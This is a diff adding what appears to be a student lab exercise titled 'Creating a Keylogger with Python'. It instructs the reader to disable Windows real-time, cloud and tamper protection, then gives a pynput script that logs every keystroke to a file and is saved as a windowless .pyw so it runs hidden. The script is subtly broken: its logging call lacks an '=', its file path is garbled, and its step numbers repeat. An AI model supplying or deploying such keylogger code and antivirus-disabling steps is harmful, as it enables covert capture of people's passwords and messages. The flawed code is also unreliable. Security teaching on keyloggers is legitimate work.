@@ -1,0 +1,31 @@
+PRACTICAL NO 9
+AIM: Creating a Keylogger with Python 
+•Write a Python script that captures and logs keystrokes from a target system. 
+•Execute the keylogger script and observe the logged keystrokes. 
+•Understand the potential security risks associated with keyloggers and the importance of protecting against them. 
+
+SOLUTION:
+Step 1 :  Open Windows Security , Click on Virus & Threat Protection setting
+
+
+Step 2 :  Turn Off the Real-Time Protection , Den-Drive Protection and Cloud-delivered protection
+
+
+Step 2 :  Open IDLE and type the following code in a new file
+from pynput.keyboard import Key, Listener 
+import logging
+log_dir="keylog.txt"
+logging.basicConfig(filename(log_dir + "key_log.txt"),level= logging.DEBUG,format='%(asctime)s:%(message)s')
+def on_press(key):
+     logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+    listener.join()
+Step 3 :  Save the file with .pyw extension
+
+Step 4 :  Run the .pyw file 
+
+
+Step 5 :  Go to google and search something in the search bar
+
+
+Step 6 :  Now open the keylog.txtkey_log.txt
